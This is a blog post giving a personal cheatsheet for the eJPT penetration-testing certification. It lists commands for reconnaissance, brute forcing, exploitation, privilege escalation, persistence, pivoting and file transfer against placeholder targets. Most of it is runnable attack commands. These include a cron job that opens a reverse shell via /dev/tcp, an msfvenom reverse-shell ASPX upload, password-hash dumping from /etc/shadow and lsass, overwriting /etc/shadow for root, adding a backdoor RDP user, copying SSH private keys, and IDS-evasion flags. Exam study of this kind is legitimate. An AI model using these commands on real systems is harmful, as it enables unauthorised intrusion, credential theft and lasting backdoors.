---
title: 📜 eJPT Cheatsheet
date: 2024-04-17
categories: [Certifications, eJPT]
tags: [ejpt, cheatsheet]
img_path: /assets/img/
---

Here is my personal eJPT cheatsheet that I built while following the associatec course and used during the exam.

## Information Gathering

### Passive Information Gathering

#### DNS Reconnaissance

- dnsrecon
- dnsdumpster

```bash
dnsrecon -d target.com
```

#### Email Harvesting

- theHarvester

```bash
theHarvester -d target.com -d google,linkedin
```

#### Google Dorks

- Google Hacking Database
- WayBackMachine

```bash
site:*.target.com
site:*.target.com intitle:admin
site:*.target.com filetype:pdf
intitle:index of
cache:target.com
```

#### Leaked Passwords Databases

- [Have I Benn Pwned](https://www.haveibeenpwned.com/)

#### Subdomain Enumeration

- sublist3r

```bash
sublist3r -d hackersploit.com -e google,yahoo -o hackersploit.txt
```

#### Detect WAF

- wafw00F

```bash
wafw00f target.com
wafw00f https://target.com -a
```

#### Website Footprinting

- [netcraft](https://netcraft.com/internet-data-mining/)
- BuiltWith
- Wappalyzer
- webhttrack

```bash
host target.com
whatweb target.com
whois target.com
```

### Active Information Gathering

#### DNS Zone Transfers

- dnsenum
- dig
- fierce

```bash
dnsenum target.com
dig axfr @subdomain target.com
fierce -dns target.com
```

#### Host Discovery

- nmap
- netdiscover

```bash
# identify host ip address
ip ad
# scan network
sudo nmap -sn 192.168.1.0/24
sudo netdiscover -i eth0 -r 192.168.1.0/24
```

- `-sn` : No port scan

## Footprinting and Scanning

- nmap
- Metasploit

### Port Scanning

- Scan all ports with `-p-` option.
- Scan specific ports with `-p 80,443` for example

- `-Pn` to disable isAlive check
- `-sU` for UDP scan
- `-sV` to perform service version scan
- `-O` to try to identify running Operating System
- `-sC` default nmap scripts to get more information from open ports

- `-A` aggressive scan combining `-sV -sC -O`
- `-T0` to scan very sneakily
- `-T5` to scan very aggressively

- `-oN file.txt` to save output in text format
- `-oX file.xml` to save output in xml format
  - Can be imported in Metasploit

Import nmap scan in MSF:

```bash
$ msfconsole
# create workspace
msf6> workspace -a <name>
# import scan
msf6> db_import xml_scan.xml
# target is now added to hosts
msf6> hosts
msf6> services
# nmap scan from msf
msf6> db_nmap <ip>
```

### Nmap Scripting Engine

```bash
# list all scripts
ls -al /usr/share/nmap/scripts
# filter by category
ls -al /usr/share/nmap/scripts | grep -e "http"
# run script
nmap --script <script1>[,<script2>,<script3>] <ip>
```

### Firewall & IDS Evasion

How to detect the presence of a firewall?

- `-sA`: send ACK packet to open port

  - To know if port if `filtered` or `unfiltered`

- How to evade Firewall/IDS?

  - `-f`: Use packet fragmenting
  - `--mtu 8`: minimum transmission unit

- Gateway IP can be spoofed to trick IDS:
  - Gateway IP is always x.x.x.1
  - `--data-length 200`
  - `-D <gateway ip>`
  - `-g 53`: spoof gateway's source port

## Enumeration

- nmap

### FTP

- Hydra

```bash
nmap <ip> -p 21 -sV
nmap <ip> -p 21 --script ftp-anon
```

Anonymous login:

```bash
ftp <ip>
> anonymous
>
ftp> get file.txt
ftp> bye
```

Brute force users:

```bash
nmap <ip> --script ftp-brute --script-args userdb=users.txt -p 21
```

Brute force credentials:

```bash
hydra -L common_users.txt -P unix_password.txt <ip> ftp
```

### HTTP

- whatweb
- dirb
- browsh
- - lynx

```bash
nmap -p 80 --script http-enum
nmap -p 80 --script http-headers
```

#### Apache

```bash
nmap <ip> -p 80 -sV --script banner
lynx http://<ip>
```

Look for `robots.txt` file.

#### IIS

```bash
whatweb <ip>
```

### SMB

- smbclient
- rpcclient
- SMBMap

```bash
nmap -p 445 --script smb-protocols <ip>
nmap -p 445 --script smb-security-mode <ip>
nmap -p 445 --script smb-enum-sessions <ip>
nmap -p 445 --script smb-enum-sessions --script-args ... <ip>
nmap -p 445 --script smb-enum-shares <ip>
```

```bash
# anonymous
smbmap -u guest -p "" -d . -H <ip>
# admin user
smbmap -u administrator -p smbserver_771 -H <ip> -x 'ipconfig'
```

```bash
> use auxiliary/scanner/smb/smb_login
> set RHOSTS <ip>
> set USER_FILE common_users.txt
> set PASS_FILE unix_passwords.txt
> set VERBOSE false # to only print succeed
```

```bash
$ psexec.py <username>@<ip> cmd.exe
Password:
C:\Windows\system32>
```

To open a meterpreter session:

```bash
> use exploit/windows/smb/psexec
> set RHOSTS <ip>
> set SMBUser <username>
> set SMBPass <password>
```

### SQL

#### MySQL

```bash
nmap -sV -p 3306 --script=mysql-empty-password
nmap -sV -p 3306 --script=mysql-info
```

```bash
mysql -h <ip> -u root
> show databases;
> use <db>;
> select * from <table>;
> select load_file("/etc/shadow");
```

```bash
msf5> use auxiliary/scanner/mysql/mysql_writable_dirs
msf5> use auxiliary/scanner/mysql/mysql_hashdump
```

##### Dictionary Attack

```bash
msf5> use/auxiliary/scanner/mysql/mysql_login
msf5> set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

```bash
hydra -l root -P unix_passwords.txt <ip> mysql
```

#### MSSQL

```bash
nmap <ip> -p 1433 --script ms-sql-info
nmap <ip> -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433
nmap <ip> -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=pass.txt
nmap <ip> -p 1433 --script ms-sql-empty-password
```

```bash
nmap <ip> -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt"
```

Using metasploit to brute force user and passwords:

```bash
> use auxiliary/scanner/mssql/mssql_login
> use auxiliary/admin/mssql/mssql_enum
> use auxiliary/admin/mssql/mssql_enum_sql_logins
> use auxiliary/admin/mssql/mssql_exec
```

### SSH

```bash
nc <ip> 22
```

```bash
ssh <user>@<ip>
```

```bash
nmap <ip> -p 22 --script ssh2-enum-algos
nmap <ip> -p 22 --script ssh2-hostkey --script-args ssh_hostkey=full
```

### RDP

```bash
...
```

#### Dictionary Attack

```bash
hydra -l student -P rockyou.txt <ip> ssh
nmap <ip> -p 22 --script ssh-brute --script-args userdb=users.txt
```

## Vulnerability Assessment

- Nessus
- searchsploit
- exploitdb
- Metasploit

## Exploitation

### Linux

#### vsFTPd

```bash
$ ftp <ip>
anonymous
$ searchploit vsftpd
$ searchsploit -m <exploit>
# brute force
# smtp can identify user acounts very easily
> use smtp/smtp_enum
# brute force with usernames
$ hydra -l <user> -P unix_users <ip> ftp
```

#### Samba

```bash
# samba smbd port 445
> use smb_version
$ searchsploit samba 3.0.20
> use multi/samba/usermap_script
```

#### PHP

```bash
# targeting port 80 Apache httpd 2.2.8
# search for /phpinfo.php file
$ searchsploit php
$ searchsploit -m
# change pwn_code
$ nc -lvnp 1234
$ python2 18836.py <ip> 80
```

### Windows

#### IIS FTP

Microsoft ftpd (port 21) it's used in combination with Microsoft IIS httpd (port 80)

```bash
# test ftp anon auth
$ nmap -sV -p 21 --script ftp-anon <ip>
# hydra brute force ftp
$ hydra -L unix_users.txt -P unix_passwords.txt <ip> ftp
$ hydra -l <username> -P unix_passwords.txt <ip> ftp
# connect
$ ftp <ip> <port>
$ msfvenom -p windows/shell/reverse_tcp LHOST=<ip> LPORT=1234 -f asp > shell.aspx
ftp> put shell.aspx
> use multi/handler
```

#### MySQL

```bash
$ searchsploit mysql
> use mysql_login
> set PASS_FILE unix_passwords.txt
$ mysql -u <user> -p -h <ip>
>show databases
```

If some web apps have restricted access you can modify the conf:

```bash
cat C:\wamp\www\wordpress\wp-config.php
cat C:\wamp\alias\phpmyadmin.conf
```

```bash
net stop wampapache
net start wampapache
```

#### OpenSSH

```bash
searchsploit OpenSSH
hydra -l vagrant -P unix_users.txt <ip> ssh
ssh <user>@<ip>
```

#### SMB

```bash
# after obtaining credentials
# go enum shares
$ smbclient -L <ip> -U <user>
$ smbmap -u <user> -p <pass>
$ enum4linux -u <user> -p <pass> <ip>
# msf modules
> smb/enum_users
$ locate psexec.py
$ python psexec.py <user>@<ip>
> smb/psexec_loggedin_users
> exploit/windows/smb/ms17_010_eternalblue
```

## Post-Exploitation

### Linux

#### Hashes

```bash
cat /etc/shadow
> use post/linux/gather/hashdump
# save hash line in a hash.txt file
gzip -d /usr/share/wordlists/rockyou.txt.gz
```

```bash
john --format=sha512crypt hash.txt --wordlist=rockyou.txt
# 1800 = sha512
hashcat -a3 -m 1800 hash.txt rockyou.txt
```

#### Local Enumeration

##### Users & Groups

```bash
m> getuid
m> shell
/bin/bash -i
$ whoami
$ groups
$ groups <user>
$ cat /etc/passwd
$ ls /home
# get last logged users (ssh or physical)
$ last
$ lastlog
```

##### Network Information

```bash
m> ifconfig
m> netstat
m> route
m> shell
/bin/bash -i
$ ip add
$ cat /etc/networks
$ cat /etc/hostname
$ cat /etc/hosts
$ cat /etc/resolv.conf
$ arp
```

##### System Information

```bash
m> shell
$ hostname
$ cat /etc/issue
$ cat /etc/*release
$ uname -a
$ env
$ lscpu
$ df -h
$ lsblk | grep sd
$ dpkg -l
```

##### Processes & Cron Jobs

```bash
m> ps
m> pgrep <process>
$ ps aux
$ top
```

```bash
# cron jobs
$ crontab -l
$ ls -al /etc/cron*
```

##### Automated

```bash
> upload LinEnum.sh
$ chmod +x LinEnum.sh
$ ./LinEnum.sh
```

#### Privilege Escalation

```bash
# list command I can run
sudo -l
# /usr/bin/man can be run as root
sudo man ls
!/bin/bash
```

```bash
# simple local enum
whoami
cat /etc/passwd
groups
groups <user>
find / -not -type l -perm -o+w 2>/dev/null
# /etc/shadow is writable
openssl passwd -1 -salt abc <new_password>
# edit /etc/shadow
root:<hash>:[...]
su
```

#### Persistence

##### Cron Jobs

```bash
ssh <user>@<ip>
# list cron jobs
$ cat /etc/cron*
# create backdoor cron jobs
$ echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1" > my_cron
nc -lvnp <port>
```

##### SSH keys

```bash
ssh <user>@<ip>
$ cd ~/.ssh
$ cat id_rsa
# copy the priv key
scp <user>@<ip>:~/.ssh/id_rsa .
chmod 400 id_rsa
ssh -i id_rsa <user>@<ip>
```

### Windows

#### Hashes

```bash
m> getprivs
m> pgrep lsass
m> migrate <id>
m> hashdump
<hashes>
# paste hashes in hashes.txt
```

```bash
john --list=formats
john --format=NT hashes.txt [--wordlist=<wordlist>]
gzip -d /usr/share/wordlists/rockyou.txt.gz
```

```bash
# id 1000 for NTLM
hashcat -a3 -m 1000 hashes.txt rockyou.txt
```

```bash
xfreerdp /u:<username> /p:<password> /v:<ip>
```

#### Local Enumeration

##### Users & Groups

```bash
m> getuid
m> getprivs
m> backgroupd
> use post/windows/gather/enum_logged_on_users
m> shell
>whoami
>whoami /priv
>query user
# see all users
>net users
>net user <user>
>net localgroup
# see users part of a group
>net localgroup administrators
```

##### Network Information

```bash
m> shell
>ipconfig
>ipconfig /all
>route print
>arp -a
>netstat -ano
>netsh firewall show state
>netsh advfirewall dump
>netsh advfirewall show allprofiles
```

##### System Information

```bash
# meterpreter session
> getuid
> sysinfo
> shell
>hostname
>systeminfo
>wmic qfe get Caption,Decription,HotfixID,InstalledOn
m> cat C:\eula.txt
```

##### Processes & Services

```bash
m> ps
m> pgrep explorer.exe
m> migrate <pid>
m> shell
# services started
>net start
>wmic service list brief
>tasklist /SVC
>schtasks /query /fo LIST [/v]
```

##### Automated

```bash
# get a meterpreter shell...
m> show_mount
> use post windows/gather/win_privs
> use post/windows/gather/enum_logged_on_users
> use post/windows/gather/checkvm
> use post/windows/gather/enum_applications
> use post/windows/gather/enum_computers
> use post/windows/gather/enum_patches
> use post/windows/gather/enum_shares
```

```bash
# clone the jaws-enum.ps1 first
m> cd C:\\
m> mkdir Temp
m> cd Temp
m> upload jaws-enum.ps1
m> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename jaws-enum.txt
m> dowload jaws-enum.txt
```

#### Privilege Escalation

```bash
# when you find credentials
# connect using python psexec
$ psexec.py <user>@<ip>
>whoami
>whoami /priv
# or connect using msf module
> use exploit/windows/smb/psexec
m>
```

```bash
> use exploit/multi/script/web_delivery
m> shell
> powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

#### Persistence

##### RDP

```bash
> use exploit/windows/http/badblue_passthru
m> pgrep explorer
m> migrate <pid>
# create backdoor user
m> run getgui -e -u <username> -p <password>
# connect to it via rdp
xfreerdp /u:<username> /p:<password> /v:<ip>
```

##### Services

```bash
> use exploit/windows/local/persistence_service
```

### Pivoting

```bash
# once with a meterpreter session
m> ipconfig
m> run autoroute -s <ip>.0/20
# list routes
m> run autoroute -p
m> background
> use auxiliary/scanner/portscann/tcp
> set RHOSTS <ip_target2>
m> portfwd add -l 1234 -p <target2_port> -r <target2_ip>
# scan portforwarded wit nmap
$ nmap -sV -p 1234 localhost
> use <module>
> set RHOSTS <target2_ip>
```

### Upgrading shells

```bash
# simple upgrade
/bin/bash -i
# first list valid shells
cat /etc/shells
# look for python
python --version
# if python is installed
python -c 'import pty; pty.spawn("/bin/bash")'
# if perl
perl -e 'exec "/bin/bash";'
# look for env
env
# set useful variables
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export TERM=xterm
export SHELL=bash
```

### Transferring Files

#### Linux

```bash
# on attack machine
python 3 -m http.server 80
# on victim machine
wget http://<ip>/<file>
```

#### Windows

```bash
python3 -m http.server 80
# dl on windows
>certutil -urlcache -f http://<ip>/<file> <file>
```
